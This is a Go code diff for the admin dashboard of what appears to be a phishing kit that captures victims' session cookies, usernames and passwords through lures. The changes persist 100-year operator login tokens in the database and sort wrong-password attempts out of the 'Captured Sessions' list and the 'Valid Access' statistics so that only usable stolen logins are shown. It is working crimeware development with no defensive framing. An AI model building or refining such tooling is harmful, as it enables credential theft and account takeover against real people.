@@ -169,9 +169,6 @@ type Dashboard struct {
 	authToken string
 	port      int
 	srv       *http.Server
-
-	loginTokens   map[string]time.Time
-	loginTokensMu sync.Mutex
 }
 
 const (
@@ -183,26 +180,21 @@ func (d *Dashboard) generateLoginToken() string {
 	b := make([]byte, 32)
 	rand.Read(b)
 	token := hex.EncodeToString(b)
-	d.loginTokensMu.Lock()
-	for k := range d.loginTokens {
-		if time.Now().After(d.loginTokens[k]) {
-			delete(d.loginTokens, k)
-		}
-	}
-	d.loginTokens[token] = time.Now().Add(100 * 365 * 24 * time.Hour)
-	d.loginTokensMu.Unlock()
+	// Persist to DB so the token survives restarts (in-memory maps die with
+	// the process, which is exactly what caused the "keeps logging me out"
+	// loop after every service restart).
+	expiry := time.Now().Add(100 * 365 * 24 * time.Hour)
+	d.db.SetLoginToken(token, expiry.Unix())
 	return token
 }
 
 func (d *Dashboard) isValidLoginToken(token string) bool {
-	d.loginTokensMu.Lock()
-	defer d.loginTokensMu.Unlock()
-	expiry, ok := d.loginTokens[token]
+	expiresAt, ok := d.db.GetLoginToken(token)
 	if !ok {
 		return false
 	}
-	if time.Now().After(expiry) {
-		delete(d.loginTokens, token)
+	if time.Now().After(time.Unix(expiresAt, 0)) {
+		d.db.DeleteLoginToken(token)
 		return false
 	}
 	return true
@@ -268,11 +260,10 @@ type apiLure struct {
 
 func New(db *database.Database, cfg *core.Config, authToken string, port int) *Dashboard {
 	return &Dashboard{
-		db:          db,
-		cfg:         cfg,
-		authToken:   authToken,
-		port:        port,
-		loginTokens: make(map[string]time.Time),
+		db:        db,
+		cfg:       cfg,
+		authToken: authToken,
+		port:      port,
 	}
 }
 
@@ -432,11 +423,25 @@ func (d *Dashboard) handleSessions(w http.ResponseWriter, r *http.Request) {
 		wg.Wait()
 
 		apiSessions := make([]apiSession, 0)
+		// Wrong-password attempts keep their invalid-log entry now (it is only
+		// deleted on genuine auth completion), so exclude any session that has
+		// one — they belong in Invalid Sessions, never in Captured Sessions.
+		invalidBySession := make(map[string]bool)
+		if logs, err := d.db.ListInvalidLogs(); err == nil {
+			for _, l := range logs {
+				if l.SessionId != "" {
+					invalidBySession[l.SessionId] = true
+				}
+			}
+		}
 		for _, s := range sessions {
 			// Captured Sessions = ONLY valid COMPLETE logs: cookies captured AND
 			// BOTH email (username) and password present. Anything incomplete
 			// (missing email, missing password, or no cookies) never shows here.
 			if s.CookieTokens != nil && len(s.CookieTokens) > 0 && s.Username != "" && s.Password != "" {
+				if invalidBySession[s.SessionId] {
+					continue
+				}
 				apiSessions = append(apiSessions, d.dbSessionToAPI(s))
 			}
 		}
@@ -600,8 +605,9 @@ func (d *Dashboard) handleStats(w http.ResponseWriter, r *http.Request) {
 	for _, s := range sessions {
 		if s.CookieTokens != nil && len(s.CookieTokens) > 0 {
 			withCookies++
-			// Valid Access = complete logs only: cookies AND both creds
-			if s.Username != "" && s.Password != "" {
+			// Valid Access = complete logs only: cookies AND both creds,
+			// AND no invalid-log entry (wrong-password attempt)
+			if s.Username != "" && s.Password != "" && !invalidBySession[s.SessionId] {
 				validAccess++
 			}
 		} else {
